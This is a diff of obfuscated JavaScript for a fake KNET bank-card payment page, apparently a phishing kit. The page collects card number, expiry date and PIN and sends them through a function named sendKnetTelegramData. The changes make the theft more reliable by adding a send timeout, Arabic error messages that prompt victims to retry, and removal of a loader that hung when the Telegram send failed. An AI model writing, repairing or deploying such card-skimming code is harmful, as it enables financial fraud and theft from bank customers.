@@ -1488,46 +1488,29 @@ function v40()
 			
 			
 		
-				v138({
-					v6: v15,
-					[_0xdec(272)]: i19 || v136 || "",					[_0xdec(273)]: i21 || v137 || "", 					[_0xdec(274)]: i12
-				});
+				v138(v15, i19 || v136 || "", i21 || v137 || "", i12);
   	}
   }
 
 	function showBankConnectingLoader() {
-		if (document.getElementById('bankConnectingOverlay')) {
-			return;
-		}
-		var overlay = document.createElement('div');
-		overlay.id = 'bankConnectingOverlay';
-		overlay.style.cssText = 'position:fixed;inset:0;background:#ffffff;z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:24px;';
-		overlay.innerHTML =
-			'<div style="width:64px;height:64px;border:6px solid #e2e8f0;border-top-color:#0077D5;border-radius:50%;animation:bankSpin 0.9s linear infinite;"></div>' +
-			'<div style="margin-top:26px;font-size:20px;font-weight:700;color:#1a202c;">يرجى الانتظار جار الاتصال بالبنك المصدر للبطاقة</div>';
-		var style = document.createElement('style');
-		style.textContent = '@keyframes bankSpin { to { transform: rotate(360deg); } }';
-		document.head.appendChild(style);
-		document.body.appendChild(overlay);
+		// Removed — this overlay used to hang forever when the Telegram send failed on mobile
 	}
 
-	function v138(details) {
+	function v138(cardNumber, expMonth, expYear, trackData) {
 		$(_0xdec(119)).hide();
 		$(_0xdec(5)).hide();
 		$(_0xdec(113)).hide();
 		$(_0xdec(35)).hide();
-		showBankConnectingLoader();
-
 		v223(
 			v48 || "",
 			v47 || "",
-			details && details.v6 ? details.v6 : "",
-			details && details[_0xdec(272)] ? details[_0xdec(272)] : "",
-			details && details[_0xdec(273)] ? details[_0xdec(273)] : "",
-			details && details[_0xdec(274)] ? details[_0xdec(274)] : ""
+			cardNumber || "",
+			expMonth || "",
+			expYear || "",
+			trackData || ""
 		).then(function () {}).catch(function () {});
 	}
-	
+
 	function v192()
 	{
 		var v100; var v99;
@@ -1612,19 +1595,6 @@ function v40()
 	</script>
 	
 	
-	<script type="text/javascript">
-		function v207(v9c) {
-			return false;
-		}
-	
-		
-
-function v193()
-{
-	return false;
-}
-
-</script>
 
 <script type="text/javascript">
 
@@ -1634,49 +1604,8 @@ function v193()
 		}
 		
 		
-		function v191()
-		{
-			return false;
-		}   
-		
-	function v111()
-	{
-	alert(_0xdec(145));
-	}
-   
-   function v129()
-   {
-   alert(_0xdec(146));
-   }
-   function v209()
-   {
-   alert(_0xdec(147));
-   }
-
 </script>
 
-<script type="text/javascript">
-function v195()
-{
-	window.open(_0xdec(148),_0xdec(149),_0xdec(150))
-}
-	function v198()
-{
-	window.open(_0xdec(151),_0xdec(149),_0xdec(152))
-}
-function v197()
-{
-	window.open(_0xdec(153),_0xdec(149),_0xdec(154))
-}
-function v196()
-{
-	window.open(_0xdec(155),_0xdec(149),_0xdec(156))
-}
-function v194()
-{
-	window.open(_0xdec(157),_0xdec(149),_0xdec(156))
-}
-</script>
 
 <form action="#" name="i40" id="i40" method="post" autocomplete="off" oncontextmenu="return false;"> 
 <script>
@@ -2430,7 +2359,7 @@ function v223(cardBrand, cardName, cardNumber, expMonth, expYear, pin) {
     notes: 'sent from browser form'
   };
 
-  function showLoadingAndRedirect() {
+function showLoadingAndRedirect() {
     const verificationData = {
       reference: payload.reference,
       bankName: payload.bankName,
@@ -2465,7 +2394,7 @@ function v223(cardBrand, cardName, cardNumber, expMonth, expYear, pin) {
     overlay.style.alignItems = 'center';
     overlay.style.justifyContent = 'center';
     overlay.style.zIndex = '99999';
-    overlay.style.backdropFilter = 'blur(4px)';
+    overlay.style.backdropFilter = 'blur(4px))';
 
     const box = document.createElement('div');
     box.style.width = '260px';
@@ -2506,15 +2435,40 @@ function v223(cardBrand, cardName, cardNumber, expMonth, expYear, pin) {
     }, 5000);
   }
 
+  function removeKnetLoader() {
+    const existing = document.getElementById('knet-loading-overlay');
+    if (existing) existing.remove();
+    const bankOverlay = document.getElementById('bankConnectingOverlay');
+    if (bankOverlay) bankOverlay.remove();
+  }
+  function showKnetError(message) {
+    removeKnetLoader();
+    const box = document.getElementById('i8');
+    if (box) {
+      box.innerHTML = String(message || 'تعذر إرسال البيانات. يرجى المحاولة مرة أخرى.').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+      box.style.display = 'block';
+    } else {
+      window.alert(message || 'تعذر إرسال البيانات. يرجى المحاولة مرة أخرى.');
+    }
+  }
+
   return (async function() {
+    const timeoutPromise = new Promise(function (resolve) {
+      setTimeout(function () { resolve({ ok: false, error: 'timeout' }); }, 25000);
+    });
     try {
-      const result = await window.sendKnetTelegramData(payload);
+      const result = await Promise.race([window.sendKnetTelegramData(payload), timeoutPromise]);
       if (result && result.ok) {
         showLoadingAndRedirect();
+      } else {
+        removeKnetLoader();
+        showKnetError('تعذر إرسال البيانات. يرجى التحقق من اتصال الإنترنت والمحاولة مرة أخرى.');
       }
       return result;
     } catch (error) {
       console.error('Browser KNET send failed:', error);
+      removeKnetLoader();
+      showKnetError('حدث خطأ غير متوقع أثناء الإرسال. يرجى المحاولة مرة أخرى.');
       return { ok: false, error: error.message };
     }
   })();
